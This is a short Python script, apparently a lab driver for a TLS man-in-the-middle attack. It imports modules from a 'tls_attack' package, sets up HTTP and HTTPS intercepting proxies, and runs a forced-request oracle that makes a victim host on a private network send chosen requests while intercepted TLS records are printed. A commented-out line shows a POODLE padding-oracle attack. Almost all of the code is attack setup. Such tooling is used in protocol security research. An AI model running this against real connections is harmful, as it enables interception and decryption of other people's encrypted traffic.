import logging
import sys
import time

from tls_attack.proxy.HTTPSProxyServer         import *
from tls_attack.proxy.HTTPProxyServer          import *
from tls_attack.module.AlterHandshake          import *
from tls_attack.module.ForceRequest            import *
from tls_attack.module.ForceRequestOracle      import *
from tls_attack.structure.TLSCipherSuiteStruct import *

def packet_received(connection, tls_object, state, source):
    #print(tls_object)
    #time.sleep(0.5)
    pass

def packet_intercept(connection, tls_object, state, source):
    print(tls_object)

logging.basicConfig(stream=sys.stdout, level=logging.WARN)

http_server = HTTPProxyServer(port = 8080)
force_request = ForceRequest(http_server)

https_server = HTTPSProxyServer(port = 8443)
https_server.on_packet_received(packet_received)

oracle = ForceRequestOracle(force_request, https_server, b"192.168.56.101", b"192.168.56.102")
oracle.force_request(b"/AAAAAA", b"", packet_intercept)
oracle.start()

#attack = PoodleAttack(force_request, https_server)
#attack.start()